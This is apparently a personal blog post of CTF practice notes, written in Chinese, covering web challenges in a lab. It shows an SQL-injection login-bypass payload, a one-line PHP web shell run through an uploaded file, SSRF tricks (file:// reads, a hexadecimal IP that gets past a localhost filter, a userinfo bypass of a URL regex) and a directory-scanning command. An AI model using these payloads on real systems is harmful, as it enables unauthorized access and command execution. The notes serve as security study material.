---
title: CTF 刷题笔记
category: 零碎随笔
published: 2026-06-04
image: ./cover.jpg
tags: ["随笔"]
---
最近想去参加一个CTF相关的比赛，开始刷了一些 Web 相关的题目，接触到了 SQL 注入，文件上传漏洞，SSRF 漏洞以及通过编码的方式绕过等等，很多方式都是我没有想过的，但是让我印象比较深的是 Linux 相关的攻击，都是 Linux 基础知识我却没有怎么用过以及没有想到过。

## SQL 注入漏洞

刷到的有两道题目，分别

让我知道 `load_file()` 函数用法以及 SQL 语句的拼接，造成直接登录的方法。

### `load_file()` 函数

之前在学习 MySQL 的时候从始至终没有听说过，甚至都没有想到会有这么一个功能的出现，功能应该是类似于 `cat` 的，但是控制数据库不能代表可以控制数据库存在的机器，所以使用数据库去获取文件应该是一个方法，`load_file()` 应该也只是皮毛，但是这个函数也能打开相关的思路

### 语句拼接

在我看来，SQL 就是一个人能看的懂的逻辑语句，所以 SQL 的查询是不可能出现不输入密码或者用其他办法干扰查询的，但是事实上我就已经错了

```sql
SELECT * FROM user_tab WHERE user = '$name' AND password = '$password'
```

这是一个题目的提示，填入用户名与密码，用户名已经默认是 **`admin`**

也就是填入的东西需要改变语句的结构，让 `password`  的判断失效，也就只有一个东西能够做到 —— 注释。

首先需要一个横真条件，就使用 `1=1` ，但是这个内容如果出现在 `password` 中就会被视为字符串，所以需要将其脱离后方 `'` 的控制，加上注释符就变成 `1=1#`。然后需要补全 `password` 的 `''` 并将其架空，最后变成

```text
' or 1=1#
```

语句完整拼接如下：

```sql
SELECT * FROM users_tab WHERE user='admin' AND password='' or 1=1#'
```

因为注释的原因显得复杂，于是将注释去掉

```sql
SELECT * FROM users_tab WHERE (user='admin' AND password='') or 1=1
```

`(password='' or 1=1)` 可以转换成 `True` 条件，所以变成

```sql
SELECT * FROM users_tab WHERE True
```

将 `True` 这个可以直接通过的条件忽略，查询语句就是这样

```sql
SELECT * FROM users_tab
```

## 文件上传漏洞

利用 `php` 的函数漏洞进行的攻击

在上传文件的时候上传过大的文件会显示上传的目录，这里是 `upload`，所以上传一个木马 `php` 文件就可以直接对服务器系统进行命令输入

```php
<?php system($_GET[1]); ?>
```

只要使用 `GET` 请求对 `1` 这个变量进行传参就可以使用 `system()` 函数执行传入的参数，所以参数只要是系统命令则可以直接执行

```text
http://192.168.1.3:8084/uploads/test.php?1=ls /
```

这样就能查根目录了

## SSRF

这个漏洞我一开始都不知道能有什么用处，但是当和AI沟通后才知道危害是在正向代理服务器等地方会出现，也就是类似于音乐软件歌单导入等场景下也是可以实现查看服务器文件的功能的

### 查看文件

需要在前面加上

```text
file://
```

例如

```text
file:///flag
```

### 十六进制替代

```php
if($urlp['scheme']==='http' && !preg_match_all('/localhost|127.0.0/|file', $url))
```

源码中出现这样的过滤已经没有正常的方法去访问 `127.0.0.1` ，但是还有一种改变明文文字，但是不改变结果的方法，**十六进制绕过**

访问这个即可拿到

```text
http://0x7F000001/flag.php
```

### URL格式

```php
if(preg_match('/^http:\/\/ssrf\..*me$/i', $url))
```

如果满足这样的一个格式请求才能发出去，注意转义字符

```text
http://ssrf.(中间内容任意)me
```

我们自己知道的格式是

```text
IP/Domain:端口
```

但是全部的则是

```text
协议://[用户名:密码@]主机名[:端口]/路径?查询#片段
```

所以我们需要将 `127.0.0.1/flag,php` 放在 `主机名[:端口]/路径` 的地方

```text
http://[用户名:密码@]127.0.0.1/flag.php?查询#片段
```

所以 `[用户名:密码@]` 就是 `ssrf.` ，`?查询#片段` 要是 `me` 结尾

最简单写法就是

```text
http://ssrf.@127.0.0.1/flag.php/?me
```

## 例题

最近做了一道题目，不是专项训练，里面出现了一个让人很无语的事情发生，有这样的一个靶场

![](https://pic.ivoinkwell.xyz/file/blog/specks/ctf-practice-notes/ctf-practice-notes.webp)

看起来应该是一个文件上传漏洞，比如 php 的

```php
<?php system($_GET[1]); ?>
```

或者是 XML 以及 `.htaccess` 这样的方法，但是上传一个有任意特殊字符的文件是直接返回 `403` 

![](https://pic.ivoinkwell.xyz/file/blog/specks/ctf-practice-notes/ctf-practice-notes-1.webp)

![](https://pic.ivoinkwell.xyz/file/blog/specks/ctf-practice-notes/ctf-practice-notes-2.webp)

我这里上传的是一份 Markdown 文件，其中最基础的特殊字符 `#` 都是无法上传的，但是上传一个内容为 `Hello World` 的 `php` 却可以上传并且访问

![](https://pic.ivoinkwell.xyz/file/blog/specks/ctf-practice-notes/ctf-practice-notes-3.webp)

![](https://pic.ivoinkwell.xyz/file/blog/specks/ctf-practice-notes/ctf-practice-notes-4.webp)

也就是说其实对于文件类型是根本没有任何防护的，防御的只有文件内的文字内容，所以**上传攻击文件**的方式完全无法实现

最后通过扫描网站的方式成功找到 `robot.txt` 文件，看到 flag

```markdown
使用工具 **[dirsx](https://github.com/chasingboy/dirsx)**


wget https://github.com/chasingboy/dirsx/releases/download/dirsx-v1.8.2/dirsx-linux-amd.zip

unzip dirsx-linux-amd.zip

cd ./dirsx-linux-amd

./dirsx -u http://192.168.1.3:55003 -w '/home/kali/dirsx-linux-amd/wordlist/fuzzing-payloads-common.txt'
```

## 总结

比赛还未开始，过程还未书写，结局则不可能提前出现，有一句话我觉得十分有价值

```text
取法于上，仅得其中。取法于中，仅得其下。
```

我觉得用我的说法是，我会押上我的一切去完成这个我想要达到的最终目标，当然这个目标至少不是人类欲望的载体。
